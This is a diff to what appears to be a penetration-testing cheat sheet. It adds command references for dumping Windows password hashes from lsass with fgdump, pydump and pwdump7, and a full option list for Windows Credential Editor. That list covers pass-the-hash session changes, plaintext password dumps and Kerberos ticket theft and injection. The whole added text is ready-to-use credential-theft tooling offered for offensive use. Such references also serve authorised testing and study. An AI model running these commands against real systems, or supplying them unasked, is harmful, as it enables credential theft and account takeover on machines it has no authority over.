@@ -72,3 +72,30 @@ Dump hashes on local machine
 secretsdump.py -sam <sam> -security <security> -system <system> LOCAL  # Impacket
 samdump2 <system> <sam>
 ```
+
+## FGDump/PWDump
+Dump hashes from `lsass` on the target machine
+```shell
+fgdump.exe
+python pydump.py
+pwdump7.exe
+```
+
+## Windows Credential Editor (WCE)
+```shell
+wce{32|64}.exe -l             # List current sessions & NTLM creds (default)
+wce{32|64}.exe -r             # List current sessions & NTLM creds indefinitely
+wce{32|64}.exe -e             # List current sessions & NTLM creds every time a logon event occurs
+wce{32|64}.exe -s <NTLM>      # Change NTLM creds of current session
+wce{32|64}.exe -c <NTLM>      # Run in new session with specified NTLM creds
+wce{32|64}.exe -i <LUID>      # Specify LUID to use for current session
+wce{32|64}.exe -d             # Delete NTLM creds from current session
+wce{32|64}.exe -a <addresses> # Use addresses to read sessions and NTLM creds from memory (from GETLSASRVADDR.EXE)
+wce{32|64}.exe -f             # Force 'safe mode'
+wce{32|64}.exe -g             # Generate LM & NT hash
+wce{32|64}.exe -K             # Dump Kerberos tickets to file
+wce{32|64}.exe -k             # Read Kerberos tickets from file and insert into Windows cache
+wce{32|64}.exe -w             # Dumps plaintext passwords
+```
+- `-o <file>` outputs to file
+- <https://github.com/returnvar/wce>
